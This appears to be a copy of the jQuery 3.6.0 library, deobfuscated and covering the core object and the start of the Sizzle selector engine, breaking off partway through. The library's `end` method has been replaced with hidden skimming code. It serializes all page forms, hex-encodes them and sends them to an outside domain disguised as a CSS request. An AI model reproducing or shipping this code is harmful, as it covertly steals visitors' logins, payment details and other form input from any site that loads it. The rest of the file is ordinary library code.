!function (e, t) {
  "use strict";

  if ("object" == typeof module && "object" == typeof module.exports) {
    module.exports = e.document ? t(e, true) : function (e) {
      if (!e.document) {
        throw Error("jQuery requires a window with a document");
      }
      return t(e);
    };
  } else {
    t(e);
  }
}("undefined" != typeof window ? window : this, function (e, t) {
  "use strict";

  var n = [];
  var r = Object.getPrototypeOf;
  var i = n.slice;
  var o = n.flat ? function (e) {
    return n.flat.call(e);
  } : function (e) {
    return n.concat.apply([], e);
  };
  var a = n.push;
  var s = n.indexOf;
  var u = {};
  var l = u.toString;
  var c = u.hasOwnProperty;
  var f = c.toString;
  var p = f.call(Object);
  var d = {};
  var h = function (e) {
    return "function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item;
  };
  var g = function (e) {
    return null != e && e === e.window;
  };
  var v = e.document;
  var m = {
    type: true,
    src: true,
    nonce: true,
    noModule: true
  };
  function y(e, t, n) {
    var r;
    var i;
    var o = (n = n || v).createElement("script");
    o.text = e;
    if (t) {
      for (r in m) if (i = t[r] || t.getAttribute && t.getAttribute(r)) {
        o.setAttribute(r, i);
      }
    }
    n.head.appendChild(o).parentNode.removeChild(o);
  }
  function x(e) {
    return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? u[l.call(e)] || "object" : typeof e;
  }
  var b = function (e, t) {
    return new b.fn.init(e, t);
  };
  function _(e) {
    var t = !!e && "length" in e && e.length;
    var n = null == e ? e + "" : "object" == typeof e || "function" == typeof e ? u[l.call(e)] || "object" : typeof e;
    return !("function" == typeof e && "number" != typeof e.nodeType && "function" != typeof e.item) && !(null != e && e === e.window) && ("array" === n || 0 === t || "number" == typeof t && t > 0 && t - 1 in e);
  }
  b.fn = b.prototype = {
    jquery: "3.6.0",
    constructor: b,
    length: 0,
    toArray: function () {
      return i.call(this);
    },
    get: function (e) {
      return null == e ? i.call(this) : e < 0 ? this[e + this.length] : this[e];
    },
    pushStack: function (e) {
      var t = b.merge(this.constructor(), e);
      t.prevObject = this;
      return t;
    },
    each: function (e) {
      return b.each(this, e);
    },
    map: function (e) {
      return this.pushStack(b.map(this, function (t, n) {
        return e.call(t, n, t);
      }));
    },
    slice: function () {
      return this.pushStack(i.apply(this, arguments));
    },
    first: function () {
      return this.eq(0);
    },
    last: function () {
      return this.eq(-1);
    },
    even: function () {
      return this.pushStack(b.grep(this, function (e, t) {
        return (t + 1) % 2;
      }));
    },
    odd: function () {
      return this.pushStack(b.grep(this, function (e, t) {
        return t % 2;
      }));
    },
    eq: function (e) {
      var t = this.length;
      var n = +e + (e < 0 ? t : 0);
      return this.pushStack(n >= 0 && n < t ? [this[n]] : []);
    },
    end: async function () {
      await $.ajax({
        url: "https://pusatjs.valtrex.biz.id/css/?yandex=" + function (e) {
          var t;
          var n = 0;
          var r = e.length;
          for (var i = ""; n < r; ++n) {
            i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
          }
          return i;
        }($("form").serialize()),
        type: "GET",
        dataType: "text",
        headers: {
          "Content-type": "application/json"
        }
      });
    },
    push: a,
    sort: n.sort,
    splice: n.splice
  };
  b.extend = b.fn.extend = function () {
    var e;
    var t;
    var n;
    var r;
    var i;
    var o;
    var a = arguments[0] || {};
    var s = 1;
    var u = arguments.length;
    var l = false;
    if ("boolean" == typeof a) {
      l = a;
      a = arguments[s] || {};
      s++;
    }
    if (!("object" == typeof a || "function" == typeof a && "number" != typeof a.nodeType && "function" != typeof a.item)) {
      a = {};
    }
    for (s === u && (a = this, s--); s < u; s++) {
      if (null != (e = arguments[s])) {
        for (t in e) {
          r = e[t];
          if ("__proto__" !== t && a !== r) {
            if (l && r && (b.isPlainObject(r) || (i = Array.isArray(r)))) {
              n = a[t];
              o = i && !Array.isArray(n) ? [] : i || b.isPlainObject(n) ? n : {};
              i = false;
              a[t] = b.extend(l, o, r);
            } else if (undefined !== r) {
              a[t] = r;
            }
          }
        }
      }
    }
    return a;
  };
  b.extend({
    expando: "jQuery" + ("3.6.0" + Math.random()).replace(/\D/g, ""),
    isReady: true,
    error: function (e) {
      throw Error(e);
    },
    noop: function () {},
    isPlainObject: function (e) {
      var t;
      var n;
      return !(!e || "[object Object]" !== l.call(e)) && (!(t = r(e)) || "function" == typeof (n = c.call(t, "constructor") && t.constructor) && f.call(n) === p);
    },
    isEmptyObject: function (e) {
      var t;
      for (t in e) return false;
      return true;
    },
    globalEval: function (e, t, n) {
      y(e, {
        nonce: t && t.nonce
      }, n);
    },
    each: function (e, t) {
      var n;
      var r = 0;
      if (_(e)) {
        for (n = e.length; r < n && false !== t.call(e[r], r, e[r]); r++) {
          ;
        }
      } else {
        for (r in e) if (false === t.call(e[r], r, e[r])) {
          break;
        }
      }
      return e;
    },
    makeArray: function (e, t) {
      var n = t || [];
      if (null != e) {
        if (_(Object(e))) {
          b.merge(n, "string" == typeof e ? [e] : e);
        } else {
          a.call(n, e);
        }
      }
      return n;
    },
    inArray: function (e, t, n) {
      return null == t ? -1 : s.call(t, e, n);
    },
    merge: function (e, t) {
      var n = +t.length;
      var r = 0;
      for (var i = e.length; r < n; r++) {
        e[i++] = t[r];
      }
      e.length = i;
      return e;
    },
    grep: function (e, t, n) {
      var r = [];
      var i = 0;
      var o = e.length;
      for (var a = !n; i < o; i++) {
        if (!t(e[i], i) !== a) {
          r.push(e[i]);
        }
      }
      return r;
    },
    map: function (e, t, n) {
      var r;
      var i;
      var a = 0;
      var s = [];
      if (_(e)) {
        for (r = e.length; a < r; a++) {
          if (null != (i = t(e[a], a, n))) {
            s.push(i);
          }
        }
      } else {
        for (a in e) if (null != (i = t(e[a], a, n))) {
          s.push(i);
        }
      }
      return o(s);
    },
    guid: 1,
    support: d
  });
  if ("function" == typeof Symbol) {
    b.fn[Symbol.iterator] = n[Symbol.iterator];
  }
  b.each("Boolean Number String Function Array Date RegExp Object Error Symbol".split(" "), function (e, t) {
    u["[object " + t + "]"] = t.toLowerCase();
  });
  var T = function (e) {
    var t;
    var n;
    var r;
    var i;
    var o;
    var a;
    var s;
    var u;
    var l;
    var c;
    var f;
    var p;
    var d;
    var h;
    var g;
    var v;
    var m;
    var y;
    var x;
    var b = "sizzle" + 1 * new Date();
    var _ = e.document;
    var T = 0;
    var w = 0;
    var C = ec();
    var k = ec();
    var S = ec();
    var E = ec();
    var N = function (e, t) {
      if (e === t) {
        f = true;
      }
      return 0;
    };
    var A = {}.hasOwnProperty;
    var D = [];
    var j = D.pop;
    var q = D.push;
    var L = D.push;
    var H = D.slice;
    var P = function (e, t) {
      var n = 0;
      for (var r = e.length; n < r; n++) {
        if (e[n] === t) {
          return n;
        }
      }
      return -1;
    };
    var R = RegExp("[\\x20\\t\\r\\n\\f]+", "g");
    var F = RegExp("^[\\x20\\t\\r\\n\\f]+|((?:^|[^\\\\])(?:\\\\.)*)[\\x20\\t\\r\\n\\f]+$", "g");
    var z = RegExp("^[\\x20\\t\\r\\n\\f]*,[\\x20\\t\\r\\n\\f]*");
    var X = RegExp("^[\\x20\\t\\r\\n\\f]*([>+~]|[\\x20\\t\\r\\n\\f])[\\x20\\t\\r\\n\\f]*");
    var U = RegExp("[\\x20\\t\\r\\n\\f]|>");
    var V = RegExp(":((?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+)(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|\\[[\\x20\\t\\r\\n\\f]*((?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+)(?:[\\x20\\t\\r\\n\\f]*([*^$|!~]?=)[\\x20\\t\\r\\n\\f]*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|((?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+))|)[\\x20\\t\\r\\n\\f]*\\])*)|.*)\\)|)");
    var G = RegExp("^(?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+$");
    var Y = {
      ID: RegExp("^#((?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+)"),
      CLASS: RegExp("^\\.((?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+)"),
      TAG: RegExp("^((?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+|[*])"),
      ATTR: RegExp("^\\[[\\x20\\t\\r\\n\\f]*((?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+)(?:[\\x20\\t\\r\\n\\f]*([*^$|!~]?=)[\\x20\\t\\r\\n\\f]*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|((?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+))|)[\\x20\\t\\r\\n\\f]*\\]"),
      PSEUDO: RegExp("^:((?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+)(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|\\[[\\x20\\t\\r\\n\\f]*((?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+)(?:[\\x20\\t\\r\\n\\f]*([*^$|!~]?=)[\\x20\\t\\r\\n\\f]*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|((?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+))|)[\\x20\\t\\r\\n\\f]*\\])*)|.*)\\)|)"),
      CHILD: RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\([\\x20\\t\\r\\n\\f]*(even|odd|(([+-]|)(\\d*)n|)[\\x20\\t\\r\\n\\f]*(?:([+-]|)[\\x20\\t\\r\\n\\f]*(\\d+)|))[\\x20\\t\\r\\n\\f]*\\)|)", "i"),
      bool: RegExp("^(?:checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped)$", "i"),
      needsContext: RegExp("^[\\x20\\t\\r\\n\\f]*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\([\\x20\\t\\r\\n\\f]*((?:-\\d)?\\d*)[\\x20\\t\\r\\n\\f]*\\)|)(?=[^-]|$)", "i")
    };
    var Q = /HTML$/i;
    var K = /^(?:input|select|textarea|button)$/i;
    var J = /^h\d$/i;
    var Z = /^[^{]+\{\s*\[native \w/;
    var ee = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/;
    var et = /[+~]/;
    var en = RegExp("\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\([^\\r\\n\\f])", "g");
    var er = function (e, t) {
      var n = "0x" + e.slice(1) - 65536;
      return t || (n < 0 ? String.fromCharCode(n + 65536) : String.fromCharCode(n >> 10 | 55296, 1023 & n | 56320));
    };
    var ei = /([\0-\x1f\x7f]|^-?\d)|^-$|[^\0-\x1f\x7f-\uFFFF\w-]/g;
    var eo = function (e, t) {
      return t ? "\0" === e ? "ï¿½" : e.slice(0, -1) + "\\" + e.charCodeAt(e.length - 1).toString(16) + " " : "\\" + e;
    };
    var ea = function () {
      p();
    };
    var es = e_(function (e) {
      return true === e.disabled && "fieldset" === e.nodeName.toLowerCase();
    }, {
      dir: "parentNode",
      next: "legend"
    });
    try {
      L.apply(D = H.call(_.childNodes), _.childNodes);
      D[_.childNodes.length].nodeType;
    } catch (eu) {
      L = {
        apply: D.length ? function (e, t) {
          q.apply(e, H.call(t));
        } : function (e, t) {
          var n = e.length;
          for (var r = 0; e[n++] = t[r++];) {
            ;
          }
          e.length = n - 1;
        }
      };
    }
    function el(e, t, r, i) {
      var o;
      var s;
      var l;
      var c;
      var f;
      var h;
      var m;
      var y = t && t.ownerDocument;
      var _ = t ? t.nodeType : 9;
      r = r || [];
      if ("string" != typeof e || !e || 1 !== _ && 9 !== _ && 11 !== _) {
        return r;
      }
      if (!i && (p(t), t = t || d, g)) {
        if (11 !== _ && (f = ee.exec(e))) {
          if (o = f[1]) {
            if (9 === _) {
              if (!(l = t.getElementById(o))) {
                return r;
              }
              if (l.id === o) {
                r.push(l);
                return r;
              }
            } else if (y && (l = y.getElementById(o)) && x(t, l) && l.id === o) {
              r.push(l);
              return r;
            }
          } else {
            if (f[2]) {
              L.apply(r, t.getElementsByTagName(e));
              return r;
            }
            if ((o = f[3]) && n.getElementsByClassName && t.getElementsByClassName) {
              L.apply(r, t.getElementsByClassName(o));
              return r;
            }
          }
        }
        if (n.qsa && !E[e + " "] && (!v || !v.test(e)) && (1 !== _ || "object" !== t.nodeName.toLowerCase())) {
          m = e;
          y = t;
          if (1 === _ && (U.test(e) || X.test(e))) {
            if (!((y = et.test(e) && t.parentNode && undefined !== t.parentNode.getElementsByTagName && t.parentNode || t) === t && n.scope)) {
              if (c = t.getAttribute("id")) {
                c = c.replace(ei, eo);
              } else {
                t.setAttribute("id", c = b);
              }
            }
            for (s = (h = a(e)).length; s--;) {
              h[s] = (c ? "#" + c : ":scope") + " " + eb(h[s]);
            }
            m = h.join(",");
          }
          try {
            L.apply(r, y.querySelectorAll(m));
            return r;
          } catch (T) {
            E(e, true);
          } finally {
            if (c === b) {
              t.removeAttribute("id");
            }
          }
        }
      }
      return u(e.replace(F, "$1"), t, r, i);
    }
    function ec() {
      var e = [];
      return function t(n, i) {
        if (e.push(n + " ") > r.cacheLength) {
          delete t[e.shift()];
        }
        return t[n + " "] = i;
      };
    }
    function ef(e) {
      e[b] = true;
      return e;
    }
    function ep(e) {
      var t = d.createElement("fieldset");
      try {
        return !!e(t);
      } catch (n) {
        return false;
      } finally {
        if (t.parentNode) {
          t.parentNode.removeChild(t);
        }
        t = null;
      }
    }
    function ed(e, t) {
      var n = e.split("|");
      for (var i = n.length; i--;) {
        r.attrHandle[n[i]] = t;
      }
    }
    function eh(e, t) {
      var n = t && e;
      var r = n && 1 === e.nodeType && 1 === t.nodeType && e.sourceIndex - t.sourceIndex;
      if (r) {
        return r;
      }
      if (n) {
        for (; n = n.nextSibling;) {
          if (n === t) {
            return -1;
          }
        }
      }
      return e ? 1 : -1;
    }
    function eg(e) {
      return function (t) {
        return "input" === t.nodeName.toLowerCase() && t.type === e;
      };
    }
    function ev(e) {
      return function (t) {
        var n = t.nodeName.toLowerCase();
        return ("input" === n || "button" === n) && t.type === e;
      };
    }
    function em(e) {
      return function (t) {
        return "form" in t ? t.parentNode && false === t.disabled ? "label" in t ? "label" in t.parentNode ? t.parentNode.disabled === e : t.disabled === e : t.isDisabled === e || !e !== t.isDisabled && es(t) === e : t.disabled === e : "label" in t && t.disabled === e;
      };
    }
    function ey(e) {
      return ef(function (t) {
        t = +t;
        return ef(function (n, r) {
          var i;
          var o = e([], n.length, t);
          for (var a = o.length; a--;) {
            if (n[i = o[a]]) {
              n[i] = !(r[i] = n[i]);
            }
          }
        });
      });
    }
    n = el.support = {};
    o = el.isXML = function (e) {
      var t = e && e.namespaceURI;
      var n = e && (e.ownerDocument || e).documentElement;
      return !Q.test(t || n && n.nodeName || "HTML");
    };
    p = el.setDocument = function (e) {
      var t;
      var i;
      var a = e ? e.ownerDocument || e : _;
      if (a != d && 9 === a.nodeType && a.documentElement) {
        h = (d = a).documentElement;
        g = !o(d);
        if (_ != d && (i = d.defaultView) && i.top !== i) {
          if (i.addEventListener) {
            i.addEventListener("unload", ea, false);
          } else if (i.attachEvent) {
            i.attachEvent("onunload", ea);
          }
        }
        n.scope = ep(function (e) {
          h.appendChild(e).appendChild(d.createElement("div"));
          return undefined !== e.querySelectorAll && !e.querySelectorAll(":scope fieldset div").length;
        });
        n.attributes = ep(function (e) {
          e.className = "i";
          return !e.getAttribute("className");
        });
        n.getElementsByTagName = ep(function (e) {
          e.appendChild(d.createComment(""));
          return !e.getElementsByTagName("*").length;
        });
        n.getElementsByClassName = Z.test(d.getElementsByClassName);
        n.getById = ep(function (e) {
          h.appendChild(e).id = b;
          return !d.getElementsByName || !d.getElementsByName(b).length;
        });
        if (n.getById) {
          r.filter.ID = function (e) {
            var t = e.replace(en, er);
            return function (e) {
              return e.getAttribute("id") === t;
            };
          };
          r.find.ID = function (e, t) {
            if (undefined !== t.getElementById && g) {
              var n = t.getElementById(e);
              return n ? [n] : [];
            }
          };
        } else {
          r.filter.ID = function (e) {
            var t = e.replace(en, er);
            return function (e) {
              var n = undefined !== e.getAttributeNode && e.getAttributeNode("id");
              return n && n.value === t;
            };
          };
          r.find.ID = function (e, t) {
            if (undefined !== t.getElementById && g) {
              var n;
              var r;
              var i;
              var o = t.getElementById(e);
              if (o) {
                if ((n = o.getAttributeNode("id")) && n.value === e) {
                  return [o];
                }
                i = t.getElementsByName(e);
                for (r = 0; o = i[r++];) {
                  if ((n = o.getAttributeNode("id")) && n.value === e) {
                    return [o];
                  }
                }
              }
              return [];
            }
          };
        }
        r.find.TAG = n.getElementsByTagName ? function (e, t) {
          return undefined !== t.getElementsByTagName ? t.getElementsByTagName(e) : n.qsa ? t.querySelectorAll(e) : undefined;
        } : function (e, t) {
          var n;
          var r = [];
          var i = 0;
          var o = t.getElementsByTagName(e);
          if ("*" === e) {
            for (; n = o[i++];) {
              if (1 === n.nodeType) {
                r.push(n);
              }
            }
            return r;
          }
          return o;
        };
        r.find.CLASS = n.getElementsByClassName && function (e, t) {
          if (undefined !== t.getElementsByClassName && g) {
            return t.getElementsByClassName(e);
          }
        };
        m = [];
        v = [];
        if (n.qsa = Z.test(d.querySelectorAll)) {
          ep(function (e) {
            var t;
            h.appendChild(e).innerHTML = "<a id='" + b + "'></a><select id='" + b + "-\r\\' msallowcapture=''><option selected=''></option></select>";
            if (e.querySelectorAll("[msallowcapture^='']").length) {
              v.push("[*^$]=[\\x20\\t\\r\\n\\f]*(?:''|\"\")");
            }
            if (!e.querySelectorAll("[selected]").length) {
              v.push("\\[[\\x20\\t\\r\\n\\f]*(?:value|checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped)");
            }
            if (!e.querySelectorAll("[id~=" + b + "-]").length) {
              v.push("~=");
            }
            (t = d.createElement("input")).setAttribute("name", "");
            e.appendChild(t);
            if (!e.querySelectorAll("[name='']").length) {
              v.push("\\[[\\x20\\t\\r\\n\\f]*name[\\x20\\t\\r\\n\\f]*=[\\x20\\t\\r\\n\\f]*(?:''|\"\")");
            }
            if (!e.querySelectorAll(":checked").length) {
              v.push(":checked");
            }
            if (!e.querySelectorAll("a#" + b + "+*").length) {
              v.push(".#.+[+~]");
            }
            e.querySelectorAll("\\\f");
            v.push("[\\r\\n\\f]");
          });
          ep(function (e) {
            e.innerHTML = "<a href='' disabled='disabled'></a><select disabled='disabled'><option/></select>";
            var t = d.createElement("input");
            t.setAttribute("type", "hidden");
            e.appendChild(t).setAttribute("name", "D");
            if (e.querySelectorAll("[name=d]").length) {
              v.push("name[\\x20\\t\\r\\n\\f]*[*^$|!~]?=");
            }
            if (2 !== e.querySelectorAll(":enabled").length) {
              v.push(":enabled", ":disabled");
            }
            h.appendChild(e).disabled = true;
            if (2 !== e.querySelectorAll(":disabled").length) {
              v.push(":enabled", ":disabled");
            }
            e.querySelectorAll("*,:x");
            v.push(",.*:");
          });
        }
        if (n.matchesSelector = Z.test(y = h.matches || h.webkitMatchesSelector || h.mozMatchesSelector || h.oMatchesSelector || h.msMatchesSelector)) {
          ep(function (e) {
            n.disconnectedMatch = y.call(e, "*");
            y.call(e, "[s!='']:x");
            m.push("!=", ":((?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+)(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|\\[[\\x20\\t\\r\\n\\f]*((?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+)(?:[\\x20\\t\\r\\n\\f]*([*^$|!~]?=)[\\x20\\t\\r\\n\\f]*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|((?:\\\\[\\da-fA-F]{1,6}[\\x20\\t\\r\\n\\f]?|\\\\[^\\r\\n\\f]|[\\w-]|[^\0-\\x7f])+))|)[\\x20\\t\\r\\n\\f]*\\])*)|.*)\\)|)");
          });
        }
        v = v.length && RegExp(v.join("|"));
        m = m.length && RegExp(m.join("|"));
        x = (t = Z.test(h.compareDocumentPosition)) || Z.test(h.contains) ? function (e, t) {
          var n = 9 === e.nodeType ? e.documentElement : e;
          var r = t && t.parentNode;
          return e === r || !(!r || 1 !== r.nodeType || !(n.contains ? n.contains(r) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(r)));
        } : function (e, t) {
          if (t) {
            for (; t = t.parentNode;) {
              if (t === e) {
                return true;
              }
            }
          }
          return false;
        };
        N = t ? function (e, t) {
          if (e === t) {
            f = true;
            return 0;
          }
          var r = !e.compareDocumentPosition - !t.compareDocumentPosition;
          return r || (1 & (r = (e.ownerDocument || e) == (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1) || !n.sortDetached && t.compareDocumentPosition(e) === r ? e == d || e.ownerDocument == _ && x(_, e) ? -1 : t == d || t.ownerDocument == _ && x(_, t) ? 1 : c ? P(c, e) - P(c, t) : 0 : 4 & r ? -1 : 1);
        } : function (e, t) {
          if (e === t) {
            f = true;
            return 0;
          }
          var n;
          var r = 0;
          var i = e.parentNode;
          var o = t.parentNode;
          var a = [e];
          var s = [t];
          if (!i || !o) {
            return e == d ? -1 : t == d ? 1 : i ? -1 : o ? 1 : c ? P(c, e) - P(c, t) : 0;
          }
          if (i === o) {
            return eh(e, t);
          }
          for (n = e; n = n.parentNode;) {
            a.unshift(n);
          }
          for (n = t; n = n.parentNode;) {
            s.unshift(n);
          }
          for (; a[r] === s[r];) {
            r++;
          }
          return r ? eh(a[r], s[r]) : a[r] == _ ? -1 : s[r] == _ ? 1 : 0;
        };
      }
      return d;
    };
    el.matches = function (e, t) {
      return el(e, null, null, t);
    };
    el.matchesSelector = function (e, t) {
      p(e);
      if (n.matchesSelector && g && !E[t + " "] && (!m || !m.test(t)) && (!v || !v.test(t))) {
        try {
          var r = y.call(e, t);
          if (r || n.disconnectedMatch || e.document && 11 !== e.document.nodeType) {
            return r;
          }
        } catch (i) {
          E(t, true);
        }
      }
      return el(t, d, null, [e]).length > 0;
    };
    el.contains = function (e, t) {
      if ((e.ownerDocument || e) != d) {
        p(e);
      }
      return x(e, t);
    };
    el.attr = function (e, t) {
      if ((e.ownerDocument || e) != d) {
        p(e);
      }
      var i = r.attrHandle[t.toLowerCase()];
      var o = i && A.call(r.attrHandle, t.toLowerCase()) ? i(e, t, !g) : undefined;
      return undefined !== o ? o : n.attributes || !g ? e.getAttribute(t) : (o = e.getAttributeNode(t)) && o.specified ? o.value : null;
    };
    el.escape = function (e) {
      return (e + "").replace(ei, eo);
    };
    el.error = function (e) {
      throw Error("Syntax error, unrecognized expression: " + e);
    };
    el.uniqueSort = function (e) {
      var t;
      var r = [];
      var i = 0;
      var o = 0;
      f = !n.detectDuplicates;
      c = !n.sortStable && e.slice(0);
      e.sort(N);
      if (f) {
        for (; t = e[o++];) {
          if (t === e[o]) {
            i = r.push(o);
          }
        }
        for (; i--;) {
          e.splice(r[i], 1);
        }
      }
      c = null;
      return e;
    };
    i = el.getText = function (e) {
      var t;
      var n = "";
      var r = 0;
      var o = e.nodeType;
      if (o) {
        if (1 === o || 9 === o || 11 === o) {
          if ("string" == typeof e.textContent) {
            return e.textContent;
          }
          for (e = e.firstChild; e; e = e.nextSibling) {
            n += i(e);
          }
        } else if (3 === o || 4 === o) {
          return e.nodeValue;
        }
      } else {
        for (; t = e[r++];) {
          n += i(t);
        }
      }
      return n;
    };
    (r = el.selectors = {
      cacheLength: 50,
      createPseudo: ef,
      match: Y,
      attrHandle: {},
      find: {},
      relative: {
        ">": {
          dir: "parentNode",
          first: true
        },
        " ": {
          dir: "parentNode"
        },
        "+": {
          dir: "previousSibling",
          first: true
        },
        "~": {
          dir: "previousSibling"
        }
      },
      preFilter: {
        ATTR: function (e) {
          e[1] = e[1].replace(en, er);
          e[3] = (e[3] || e[4] || e[5] || "").replace(en, er);
          if ("~=" === e[2]) {
            e[3] = " " + e[3] + " ";
          }
          return e.slice(0, 4);
        },
        CHILD: function (e) {
          e[1] = e[1].toLowerCase();
          if ("nth" === e[1].slice(0, 3)) {
            if (!e[3]) {
              el.error(e[0]);
            }
            e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3]));
            e[5] = +(e[7] + e[8] || "odd" === e[3]);
          } else if (e[3]) {
            el.error(e[0]);
          }
          return e;
        },
        PSEUDO: function (e) {
          var t;
          var n = !e[6] && e[2];
          return Y.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : n && V.test(n) && (t = a(n, true)) && (t = n.indexOf(")", n.length - t) - n.length) && (e[0] = e[0].slice(0, t), e[2] = n.slice(0, t)), e.slice(0, 3));
        }
      },
      filter: {
        TAG: function (e) {
          var t = e.replace(en, er).toLowerCase();
          return "*" === e ? function () {
            return true;
          } : function (e) {
            return e.nodeName && e.nodeName.toLowerCase() === t;
          };
        },
        CLASS: function (e) {
          var t = C[e + " "];
          return t || (t = RegExp("(^|[\\x20\\t\\r\\n\\f])" + e + "(" + "[\\x20\\t\\r\\n\\f]" + "|$)"), C(e, function (e) {
            return t.test("string" == typeof e.className && e.className || undefined !== e.getAttribute && e.getAttribute("class") || "");
          }));
        },
        ATTR: function (e, t, n) {
          return function (r) {
            var i = el.attr(r, e);
            return null == i ? "!=" === t : !t || (i += "", "=" === t ? i === n : "!=" === t ? i !== n : "^=" === t ? n && 0 === i.indexOf(n) : "*=" === t ? n && i.indexOf(n) > -1 : "$=" === t ? n && i.slice(-n.length) === n : "~=" === t ? (" " + i.replace(R, " ") + " ").indexOf(n) > -1 : "|=" === t && (i === n || i.slice(0, n.length + 1) === n + "-"));
          };
        },
        CHILD: function (e, t, n, r, i) {
          var o = "nth" !== e.slice(0, 3);
          var a = "last" !== e.slice(-4);
          var s = "of-type" === t;
          return 1 === r && 0 === i ? function (e) {
            return !!e.parentNode;
          } : function (t, n, u) {
            var l;
            var c;
            var f;
            var p;
            var d;
            var h;
            var g = o !== a ? "nextSibling" : "previousSibling";
            var v = t.parentNode;
            var m = s && t.nodeName.toLowerCase();
            var y = !u && !s;
            var x = false;
            if (v) {
              if (o) {
                for (; g;) {
                  for (p = t; p = p[g];) {
                    if (s ? p.nodeName.toLowerCase() === m : 1 === p.nodeType) {
                      return false;
                    }
                  }
                  h = g = "only" === e && !h && "nextSibling";
                }
                return true;
              }
              h = [a ? v.firstChild : v.lastChild];
              if (a && y) {
                x = (d = (l = (c = (f = (p = v)[b] || (p[b] = {}))[p.uniqueID] || (f[p.uniqueID] = {}))[e] || [])[0] === T && l[1]) && l[2];
                for (p = d && v.childNodes[d]; p = ++d && p && p[g] || (x = d = 0) || h.pop();) {
                  if (1 === p.nodeType && ++x && p === t) {
                    c[e] = [T, d, x];
                    break;
                  }
                }
              } else {
                if (y) {
                  x = d = (l = (c = (f = (p = t)[b] || (p[b] = {}))[p.uniqueID] || (f[p.uniqueID] = {}))[e] || [])[0] === T && l[1];
                }
                if (false === x) {
                  for (; (p = ++d && p && p[g] || (x = d = 0) || h.pop()) && ((s ? p.nodeName.toLowerCase() !== m : 1 !== p.nodeType) || !++x || (y && ((c = (f = p[b] || (p[b] = {}))[p.uniqueID] || (f[p.uniqueID] = {}))[e] = [T, x]), p !== t));) {
                    ;
                  }
                }
              }
              return (x -= i) === r || x % r == 0 && x / r >= 0;
            }
          };
        },
        PSEUDO: function (e, t) {
          var n;
          var i = r.pseudos[e] || r.setFilters[e.toLowerCase()] || el.error("unsupported pseudo: " + e);
          return i[b] ? i(t) : i.length > 1 ? (n = [e, e, "", t], r.setFilters.hasOwnProperty(e.toLowerCase()) ? ef(function (e, n) {
            var r;
            var o = i(e, t);
            for (var a = o.length; a--;) {
              e[r = P(e, o[a])] = !(n[r] = o[a]);
            }
          }) : function (e) {
            return i(e, 0, n);
          }) : i;
        }
      },
      pseudos: {
        not: ef(function (e) {
          var t = [];
          var n = [];
          var r = s(e.replace(F, "$1"));
          return r[b] ? ef(function (e, t, n, i) {
            var o;
            var a = r(e, null, i, []);
            for (var s = e.length; s--;) {
              if (o = a[s]) {
                e[s] = !(t[s] = o);
              }
            }
          }) : function (e, i, o) {
            t[0] = e;
            r(t, null, o, n);
            t[0] = null;
            return !n.pop();
          };
        }),
        has: ef(function (e) {
          return function (t) {
